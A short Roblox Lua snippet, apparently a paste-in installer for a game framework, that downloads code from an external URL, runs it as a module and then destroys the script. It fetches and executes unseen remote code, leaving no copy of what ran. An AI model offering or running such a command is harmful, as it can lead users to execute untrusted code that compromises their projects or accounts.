local Installer = Instance.new("ModuleScript")
Installer.Source = game.HttpService:GetAsync("https://robloxframework.palehaze.com/init.lua")
require(Installer)()
Installer:Destroy()
